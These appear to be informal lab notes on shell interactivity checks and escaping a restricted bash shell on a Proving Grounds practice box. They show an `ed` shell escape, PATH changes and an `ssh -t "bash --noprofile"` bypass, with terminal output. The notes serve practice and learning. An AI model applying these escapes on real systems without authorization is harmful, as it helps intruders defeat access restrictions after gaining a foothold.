
determine if your current shell session is fully interactive.

Check the `$-` Variable (The Most Reliable Way)

The `$-` variable stores the current shell's flag options. If a shell is interactive, it will always include the letter **`i`** in this string.

You can check this instantly by running:

Bash

```
echo $-
```

- **Interactive:** You’ll see something like `himBHs` (the presence of `i` is the key).
    
- **Non-interactive:** You’ll see something like `hB`.


----------

breaking out of restrictive shells

## echo /home/xxxxx/bin/*
where xxxxx is the account you gained initial access

see what tools are available to help you escape restrictive shell


try practise using peppo in proving grounds practice

after gaining initial access via 

xxxxx@peppo:~$ echo /home/xxxxx/bin/*

/home/xxxxx/bin/chmod /home/xxxxx/bin/chown /home/xxxxx/bin/ed /home/xxxxx/bin/ls /home/xxxxx/bin/mv /home/xxxxx/bin/ping /home/xxxxx/bin/sleep /home/xxxxx/bin/touch
xxxxx@peppo:~$ 



xxxxx@peppo:~$ /home/xxxxx/bin/ed

-rbash: /home/xxxxx/bin/ed: restricted: cannot specify `/' in command names

xxxxx@peppo:~$


xxxxx@peppo:~$ ed

?
!/bin/bash
xxxxx@peppo:~$ 

xxxxx@peppo:~$ 
xxxxx@peppo:~$ export PATH=$PATH:/usr/bin:/bin
xxxxx@peppo:~$ export SHELL=/bin/bash
xxxxx@peppo:~$ 
xxxxx@peppo:~$ ed
!/bin/bash
xxxxx@peppo:~$ 
xxxxx@peppo:~$ 


`ed` is successfully spawning the shell, but because we are still in an **interactive** restricted environment, it keeps dropping us right back into the `rbash` cage once that sub-process finishes.


from **Kali terminal**:

```
ssh xxxxx@192.168.xxx.xx -t "bash --noprofile"
```

- **`-t`**: Forces a pseudo-terminal (PTY).
    
- **`--noprofile`**: Tells Bash **not** to read `/etc/profile` or `~/.profile`, which is exactly where the `rbash` restrictions are usually set.